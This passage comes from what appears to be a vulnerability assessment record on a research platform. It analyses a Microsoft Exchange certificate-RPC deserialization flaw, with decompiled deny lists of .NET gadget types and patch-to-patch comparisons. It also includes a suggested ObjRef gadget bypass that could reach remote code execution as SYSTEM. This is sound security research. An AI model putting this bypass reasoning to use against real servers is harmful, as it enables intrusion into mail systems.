\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeName = null;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected void ValidateTypeToDeserialize(Type typeToDeserialize)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (typeToDeserialize == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string fullName = typeToDeserialize.FullName;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool flag = strictMode;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!strictMode && (allowedTypesForDeserialization == null || !allowedTypesForDeserialization.Contains(fullName)) && GlobalDisallowedTypesForDeserialization.Contains(fullName))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag = true;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new InvalidOperationException($\"Type {fullName} failed deserialization (BlockList).\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (typeToDeserialize.IsConstructedGenericType)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fullName = typeToDeserialize.GetGenericTypeDefinition().FullName;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (allowedGenericsForDeserialization == null || !allowedGenericsForDeserialization.Contains(fullName) || GlobalDisallowedGenericsForDeserialization.Contains(fullName))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new BlockedDeserializeTypeException(fullName, BlockedDeserializeTypeException.BlockReason.NotInAllow, location);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (!AlwaysAllowedPrimitives.Contains(fullName) && (allowedTypesForDeserialization == null || !allowedTypesForDeserialization.Contains(fullName) || GlobalDisallowedTypesForDeserialization.Contains(fullName)) && !typeToDeserialize.IsArray && !typeToDeserialize.IsEnum && !typeToDeserialize.IsAbstract && !typeToDeserialize.IsInterface)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new BlockedDeserializeTypeException(fullName, BlockedDeserializeTypeException.BlockReason.NotInAllow, location);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (BlockedDeserializeTypeException ex)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0DeserializationTypeLogger.Singleton.Log(ex.TypeName, ex.Reason, location, (flag || strictMode) ? DeserializationTypeLogger.BlockStatus.TrulyBlocked : DeserializationTypeLogger.BlockStatus.WouldBeBlocked);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (flag)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static HashSet<string> BuildDisallowedGenerics()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new HashSet<string> { typeof(SortedSet<>).GetGenericTypeDefinition().FullName };  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static HashSet<string> BuildDisallowedTypesForDeserialization()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new HashSet<string>  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Microsoft.Data.Schema.SchemaModel.ModelStore\", \"Microsoft.FailoverClusters.NotificationViewer.ConfigStore\", \"Microsoft.IdentityModel.Claims.WindowsClaimsIdentity\", \"Microsoft.Management.UI.Internal.FilterRuleExtensions\", \"Microsoft.Management.UI.FilterRuleExtensions\", \"Microsoft.Reporting.RdlCompile.ReadStateFile\", \"Microsoft.TeamFoundation.VersionControl.Client.PolicyEnvelope\", \"Microsoft.VisualStudio.DebuggerVisualizers.VisualizerObjectSource\", \"Microsoft.VisualStudio.Editors.PropPageDesigner.PropertyPageSerializationService+PropertyPageSerializationStore\", \"Microsoft.VisualStudio.EnterpriseTools.Shell.ModelingPackage\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Microsoft.VisualStudio.Modeling.Diagnostics.XmlSerialization\", \"Microsoft.VisualStudio.Publish.BaseProvider.Util\", \"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\", \"Microsoft.VisualStudio.Web.WebForms.ControlDesignerStateCache\", \"Microsoft.Web.Design.Remote.ProxyObject\", \"System.Activities.Presentation.WorkflowDesigner\", \"System.AddIn.Hosting.AddInStore\", \"System.AddIn.Hosting.Utils\", \"System.CodeDom.Compiler.TempFileCollection\", \"System.Collections.Hashtable\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.ComponentModel.Design.DesigntimeLicenseContextSerializer\", \"System.Configuration.Install.AssemblyInstaller\", \"System.Configuration.SettingsPropertyValue\", \"System.Data.DataSet\", \"System.Data.DataViewManager\", \"System.Data.Design.MethodSignatureGenerator\", \"System.Data.Design.TypedDataSetGenerator\", \"System.Data.Design.TypedDataSetSchemaImporterExtension\", \"System.Data.SerializationFormat\", \"System.DelegateSerializationHolder\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Drawing.Design.ToolboxItemContainer\", \"System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer\", \"System.IdentityModel.Services.Tokens.MachineKeySessionSecurityTokenHandler\", \"System.IdentityModel.Tokens.SessionSecurityToken\", \"System.IdentityModel.Tokens.SessionSecurityTokenHandler\", \"System.IO.FileSystemInfo\", \"System.Management.Automation.PSObject\", \"System.Management.IWbemClassObjectFreeThreaded\", \"System.Messaging.BinaryMessageFormatter\", \"System.Resources.ResourceReader\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Resources.ResXResourceSet\", \"System.Runtime.Remoting.Channels.BinaryClientFormatterSink\", \"System.Runtime.Remoting.Channels.BinaryClientFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.BinaryServerFormatterSink\", \"System.Runtime.Remoting.Channels.BinaryServerFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.CrossAppDomainSerializer\", \"System.Runtime.Remoting.Channels.SoapClientFormatterSink\", \"System.Runtime.Remoting.Channels.SoapClientFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.SoapServerFormatterSink\", \"System.Runtime.Remoting.Channels.SoapServerFormatterSinkProvider\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\", \"System.Runtime.Serialization.Formatters.Soap.SoapFormatter\", \"System.Runtime.Serialization.NetDataContractSerializer\", \"System.Security.Claims.ClaimsIdentity\", \"System.Security.Claims.ClaimsPrincipal\", \"System.Security.Principal.WindowsIdentity\", \"System.Security.Principal.WindowsPrincipal\", \"System.Security.SecurityException\", \"System.Web.Security.RolePrincipal\", \"System.Web.Script.Serialization.JavaScriptSerializer\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Web.Script.Serialization.SimpleTypeResolver\", \"System.Web.UI.LosFormatter\", \"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem\", \"System.Web.UI.ObjectStateFormatter\", \"System.Windows.Data.ObjectDataProvider\", \"System.Windows.Forms.AxHost+State\", \"System.Windows.ResourceDictionary\", \"System.Workflow.ComponentModel.Activity\", \"System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector\", \"System.Xml.XmlDataDocument\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Xml.XmlDocument\"  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0};  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static HashSet<string> BuildGlobalDisallowedGenericsForDeserialization()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new HashSet<string>();  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\n**Interesting to note that this doesn't seem to contain the entries for `System.Runtime.Remoting.ObjectRef`** which was a new gadget chain just added with https://github.com/pwntester/ysoserial.net/pull/115 that relies on a rouge .NET remoting server like https://github.com/codewhitesec/RogueRemotingServer. There is a writeup on this at https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html that explains more but this would allow RCE via a serialized payload attached to the rouge .NET remoting server.\r\n\r\nAnyway so from earlier we know that the strict mode is determined via the line `bool strictModeStatus = Microsoft.Exchange.Data.Serialization.Serialization.GetStrictModeStatus(DeserializeLocation.ExchangeCertificateRpc);` so this provides our other bypass.\r\n\r\nLets check if the result of this is `False` or not:\r\n\r\n\r\nSo from here we can likely supply a `System.Runtime.Remoting.ObjectRef`, take advantage of the lack of strict checking on this, and get the whole exploit to work. The problem now is finding the whole chain to reach this vulnerable call and then trigger the deserialization.\r\n\r\n# January 2022 Patch Analysis\r\n- No adjustments to the `ChainedSerializationBinder` deny list at all.\r\n\r\nHere is the Jan 2022 version of the deny list:\r\n\r\n```c#\r\n\u00a0\u00a0\u00a0\u00a0private static HashSet<string> BuildDisallowedTypesForDeserialization()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new HashSet<string>  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Microsoft.Data.Schema.SchemaModel.ModelStore\", \"Microsoft.FailoverClusters.NotificationViewer.ConfigStore\", \"Microsoft.IdentityModel.Claims.WindowsClaimsIdentity\", \"Microsoft.Management.UI.Internal.FilterRuleExtensions\", \"Microsoft.Management.UI.FilterRuleExtensions\", \"Microsoft.Reporting.RdlCompile.ReadStateFile\", \"Microsoft.TeamFoundation.VersionControl.Client.PolicyEnvelope\", \"Microsoft.VisualStudio.DebuggerVisualizers.VisualizerObjectSource\", \"Microsoft.VisualStudio.Editors.PropPageDesigner.PropertyPageSerializationService+PropertyPageSerializationStore\", \"Microsoft.VisualStudio.EnterpriseTools.Shell.ModelingPackage\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"Microsoft.VisualStudio.Modeling.Diagnostics.XmlSerialization\", \"Microsoft.VisualStudio.Publish.BaseProvider.Util\", \"Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\", \"Microsoft.VisualStudio.Web.WebForms.ControlDesignerStateCache\", \"Microsoft.Web.Design.Remote.ProxyObject\", \"System.Activities.Presentation.WorkflowDesigner\", \"System.AddIn.Hosting.AddInStore\", \"System.AddIn.Hosting.Utils\", \"System.CodeDom.Compiler.TempFileCollection\", \"System.Collections.Hashtable\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.ComponentModel.Design.DesigntimeLicenseContextSerializer\", \"System.Configuration.Install.AssemblyInstaller\", \"System.Configuration.SettingsPropertyValue\", \"System.Data.DataSet\", \"System.Data.DataViewManager\", \"System.Data.Design.MethodSignatureGenerator\", \"System.Data.Design.TypedDataSetGenerator\", \"System.Data.Design.TypedDataSetSchemaImporterExtension\", \"System.Data.SerializationFormat\", \"System.DelegateSerializationHolder\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Drawing.Design.ToolboxItemContainer\", \"System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer\", \"System.IdentityModel.Services.Tokens.MachineKeySessionSecurityTokenHandler\", \"System.IdentityModel.Tokens.SessionSecurityToken\", \"System.IdentityModel.Tokens.SessionSecurityTokenHandler\", \"System.IO.FileSystemInfo\", \"System.Management.Automation.PSObject\", \"System.Management.IWbemClassObjectFreeThreaded\", \"System.Messaging.BinaryMessageFormatter\", \"System.Resources.ResourceReader\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Resources.ResXResourceSet\", \"System.Runtime.Remoting.Channels.BinaryClientFormatterSink\", \"System.Runtime.Remoting.Channels.BinaryClientFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.BinaryServerFormatterSink\", \"System.Runtime.Remoting.Channels.BinaryServerFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.CrossAppDomainSerializer\", \"System.Runtime.Remoting.Channels.SoapClientFormatterSink\", \"System.Runtime.Remoting.Channels.SoapClientFormatterSinkProvider\", \"System.Runtime.Remoting.Channels.SoapServerFormatterSink\", \"System.Runtime.Remoting.Channels.SoapServerFormatterSinkProvider\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\", \"System.Runtime.Serialization.Formatters.Soap.SoapFormatter\", \"System.Runtime.Serialization.NetDataContractSerializer\", \"System.Security.Claims.ClaimsIdentity\", \"System.Security.Claims.ClaimsPrincipal\", \"System.Security.Principal.WindowsIdentity\", \"System.Security.Principal.WindowsPrincipal\", \"System.Security.SecurityException\", \"System.Web.Security.RolePrincipal\", \"System.Web.Script.Serialization.JavaScriptSerializer\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Web.Script.Serialization.SimpleTypeResolver\", \"System.Web.UI.LosFormatter\", \"System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem\", \"System.Web.UI.ObjectStateFormatter\", \"System.Windows.Data.ObjectDataProvider\", \"System.Windows.Forms.AxHost+State\", \"System.Windows.ResourceDictionary\", \"System.Workflow.ComponentModel.Activity\", \"System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector\", \"System.Xml.XmlDataDocument\",  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"System.Xml.XmlDocument\"  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0};  \r\n\u00a0\u00a0\u00a0\u00a0}\r\n```\r\n\r\nLooking at this in [[Meld]] shows that the deny list for `ChainedSerializationBinder` did not change between November 2021 and January 2022. So we could use `System.Runtime.Remoting.ObjRef` to bypass this deny list, potentially also allowing RCE on the latest version.\r\n\r\n- Removed `Microsoft.Exchange.DxStore.Common.DxBinarySerializationUtil` which seemed to have some options for doing unsafe deserialization.\r\n\r\n```c#\r\nusing System;\r\nusing System.IO;\r\nusing FUSE.Weld.Base;\r\nusing Microsoft.Exchange.Diagnostics;\r\nusing Microsoft.Exchange.DxStore.Server;\r\n\r\nnamespace Microsoft.Exchange.DxStore.Common;\r\n\r\npublic static class DxBinarySerializationUtil\r\n{\r\n\tprivate static readonly string[] allowedTypes = new string[101]\r\n\t{\r\n\t\ttypeof(ExceptionUri).FullName,\r\n\t\ttypeof(Ranges).FullName,\r\n\t\ttypeof(Range).FullName,\r\n\t\ttypeof(Target).FullName,\r\n\t\ttypeof(CommonSettings).FullName,\r\n\t\ttypeof(DataStoreStats).FullName,\r\n\t\ttypeof(DxStoreAccessClientException).FullName,\r\n\t\ttypeof(DxStoreAccessClientTransientException).FullName,\r\n\t\ttypeof(DxStoreAccessReply).FullName,\r\n\t\ttypeof(DxStoreAccessReply.CheckKey).FullName,\r\n\t\ttypeof(DxStoreAccessReply.DeleteKey).FullName,\r\n\t\ttypeof(DxStoreAccessReply.DeleteProperty).FullName,\r\n\t\ttypeof(DxStoreAccessReply.ExecuteBatch).FullName,\r\n\t\ttypeof(DxStoreAccessReply.GetAllProperties).FullName,\r\n\t\ttypeof(DxStoreAccessReply.GetProperty).FullName,\r\n\t\ttypeof(DxStoreAccessReply.GetPropertyNames).FullName,\r\n\t\ttypeof(DxStoreAccessReply.GetSubkeyNames).FullName,\r\n\t\ttypeof(DxStoreAccessReply.SetProperty).FullName,\r\n\t\ttypeof(DxStoreAccessRequest).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.CheckKey).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.DeleteKey).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.DeleteProperty).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.ExecuteBatch).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.GetAllProperties).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.GetProperty).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.GetPropertyNames).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.GetSubkeyNames).FullName,\r\n\t\ttypeof(DxStoreAccessRequest.SetProperty).FullName,\r\n\t\ttypeof(DxStoreAccessServerTransientException).FullName,\r\n\t\ttypeof(DxStoreBatchCommand).FullName,\r\n\t\ttypeof(DxStoreBatchCommand.CreateKey).FullName,\r\n\t\ttypeof(DxStoreBatchCommand.DeleteKey).FullName,\r\n\t\ttypeof(DxStoreBatchCommand.DeleteProperty).FullName,\r\n\t\ttypeof(DxStoreBatchCommand.SetProperty).FullName,\r\n\t\ttypeof(DxStoreBindingNotSupportedException).FullName,\r\n\t\ttypeof(DxStoreClientException).FullName,\r\n\t\ttypeof(DxStoreClientTransientException).FullName,\r\n\t\ttypeof(DxStoreCommand).FullName,\r\n\t\ttypeof(DxStoreCommand.ApplySnapshot).FullName,\r\n\t\ttypeof(DxStoreCommand.CreateKey).FullName,\r\n\t\ttypeof(DxStoreCommand.DeleteKey).FullName,\r\n\t\ttypeof(DxStoreCommand.DeleteProperty).FullName,\r\n\t\ttypeof(DxStoreCommand.DummyCommand).FullName,\r\n\t\ttypeof(DxStoreCommand.ExecuteBatch).FullName,\r\n\t\ttypeof(DxStoreCommand.PromoteToLeader).FullName,\r\n\t\ttypeof(DxStoreCommand.SetProperty).FullName,\r\n\t\ttypeof(DxStoreCommand.UpdateMembership).FullName,\r\n\t\ttypeof(DxStoreCommand.VerifyStoreIntegrity).FullName,\r\n\t\ttypeof(DxStoreCommand.VerifyStoreIntegrity2).FullName,\r\n\t\ttypeof(DxStoreCommandConstraintFailedException).FullName,\r\n\t\ttypeof(DxStoreInstanceClientException).FullName,\r\n\t\ttypeof(DxStoreInstanceClientTransientException).FullName,\r\n\t\ttypeof(DxStoreInstanceComponentNotInitializedException).FullName,\r\n\t\ttypeof(DxStoreInstanceKeyNotFoundException).FullName,\r\n\t\ttypeof(DxStoreInstanceNotReadyException).FullName,\r\n\t\ttypeof(DxStoreInstanceServerException).FullName,\r\n\t\ttypeof(DxStoreInstanceServerTransientException).FullName,\r\n\t\ttypeof(DxStoreInstanceStaleStoreException).FullName,\r\n\t\ttypeof(DxStoreManagerClientException).FullName,\r\n\t\ttypeof(DxStoreManagerClientTransientException).FullName,\r\n\t\ttypeof(DxStoreManagerGroupNotFoundException).FullName,\r\n\t\ttypeof(DxStoreManagerServerException).FullName,\r\n\t\ttypeof(DxStoreManagerServerTransientException).FullName,\r\n\t\ttypeof(DxStoreReplyBase).FullName,\r\n\t\ttypeof(DxStoreRequestBase).FullName,\r\n\t\ttypeof(DxStoreSerializeException).FullName,\r\n\t\ttypeof(DxStoreServerException).FullName,\r\n\t\ttypeof(DxStoreServerFault).FullName,\r\n\t\ttypeof(DxStoreServerTransientException).FullName,\r\n\t\ttypeof(HttpReply).FullName,\r\n\t\ttypeof(HttpReply.DxStoreReply).FullName,\r\n\t\ttypeof(HttpReply.ExceptionReply).FullName,\r\n\t\ttypeof(HttpReply.GetInstanceStatusReply).FullName,\r\n\t\ttypeof(HttpRequest).FullName,\r\n\t\ttypeof(HttpRequest.DxStoreRequest).FullName,\r\n\t\ttypeof(HttpRequest.GetStatusRequest).FullName,\r\n\t\ttypeof(HttpRequest.GetStatusRequest.Reply).FullName,\r\n\t\ttypeof(HttpRequest.PaxosMessage).FullName,\r\n\t\ttypeof(InstanceGroupConfig).FullName,\r\n\t\ttypeof(InstanceGroupMemberConfig).FullName,\r\n\t\ttypeof(InstanceGroupSettings).FullName,\r\n\t\ttypeof(InstanceManagerConfig).FullName,\r\n\t\ttypeof(InstanceSnapshotInfo).FullName,\r\n\t\ttypeof(InstanceStatusInfo).FullName,\r\n\t\ttypeof(LocDescriptionAttribute).FullName,\r\n\t\ttypeof(PaxosBasicInfo).FullName,\r\n\t\ttypeof(PaxosBasicInfo.GossipDictionary).FullName,\r\n\t\ttypeof(ProcessBasicInfo).FullName,\r\n\t\ttypeof(PropertyNameInfo).FullName,\r\n\t\ttypeof(PropertyValue).FullName,\r\n\t\ttypeof(ReadOptions).FullName,\r\n\t\ttypeof(ReadResult).FullName,\r\n\t\ttypeof(WcfTimeout).FullName,\r\n\t\ttypeof(WriteOptions).FullName,\r\n\t\ttypeof(WriteResult).FullName,\r\n\t\ttypeof(WriteResult.ResponseInfo).FullName,\r\n\t\ttypeof(GroupStatusInfo).FullName,\r\n\t\ttypeof(GroupStatusInfo.NodeInstancePair).FullName,\r\n\t\ttypeof(InstanceMigrationInfo).FullName,\r\n\t\ttypeof(KeyContainer).FullName,\r\n\t\ttypeof(DateTimeOffset).FullName\r\n\t};\r\n\r\n\tprivate static readonly string[] allowedGenerics = new string[6] { \"System.Collections.Generic.ObjectEqualityComparer`1\", \"System.Collections.Generic.EnumEqualityComparer`1\", \"System.Collections.Generic.EqualityComparer`1\", \"System.Collections.Generic.GenericEqualityComparer`1\", \"System.Collections.Generic.KeyValuePair`2\", \"System.Collections.Generic.List`1\" };\r\n\r\n\tpublic static void Serialize(MemoryStream ms, object obj)\r\n\t{\r\n\t\tExchangeBinaryFormatterFactory.CreateSerializeOnlyFormatter().Serialize(ms, obj);\r\n\t}\r\n\r\n\tpublic static object DeserializeUnsafe(Stream s)\r\n\t{\r\n\t\treturn ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.HttpBinarySerialize).Deserialize(s);\r\n\t}\r\n\r\n\tpublic static object Deserialize(Stream s)\r\n\t{\r\n\t\treturn DeserializeSafe(s);\r\n\t}\r\n\r\n\tpublic static object DeserializeSafe(Stream s)\r\n\t{\r\n\t\treturn ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.SwordFish_AirSync, strictMode: false, allowedTypes, allowedGenerics).Deserialize(s);\r\n\t}\r\n}\r\n```\r\n- Added in `Microsoft.Exchange.DxStore.Common.IDxStoreDynamicConfig.cs`  which has the following code:\r\n\r\n```c#\r\nnamespace Microsoft.Exchange.DxStore.Common;\r\n\r\npublic interface IDxStoreDynamicConfig\r\n{\r\n\tbool IsRemovePublicKeyToken { get; }\r\n\r\n\tbool IsSerializerIncompatibleInitRemoved { get; }\r\n\r\n\tbool EnableResolverTypeCheck { get; }\r\n\r\n\tbool EnableResolverTypeCheckException { get; }\r\n}\r\n```\r\n\r\n\r\n# Exploit Chain\r\nLets start at the deserialization chain and work backwards.\r\n\r\n```\r\nMicrosoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc.DeserializeObject\r\nMicrosoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc.ExchangeCertificateRpc(ExchangeCertificateRpcVersion version, byte[] inputBlob, byte[] outputBlob)\r\nMicrosoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServerHelper.GetCertificate(int version, byte[] inputBlob)\r\nMicrosoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServer.GetCertificate(int version, byte[] inputBlob)\r\n```\r\n\r\nWe can then use the `Get-ExchangeCertificate` commandlet from https://docs.microsoft.com/en-us/powershell/module/exchange/get-exchangecertificate?view=exchange-ps and set a breakpoint inside `Microsoft.Exchange.ExchangeCertificateServicelet.dll` specifically within the `Microsoft.Exchange.Servicelets.ExchangeCertificate.GetCertificate` handler.\r\n\r\nUnfortunately it seems like the current way things work we are sending a `ExchangeCertificateRpcVersion rpcVersion` with a version of `Version2`.\r\n\r\nExploited process is `Microsoft.Exchange.ServiceHost.exe` which runs as `NT AUTHORITY\\SYSTEM`.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "2317beb7-ff51-4039-9a30-33600665f62a",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "20f6a28b-9396-42db-9259-b97ca053f45f",
      "created": "2022-07-13T22:06:15.032603Z",
      "revisionDate": "2022-07-13T22:17:39.098167Z",
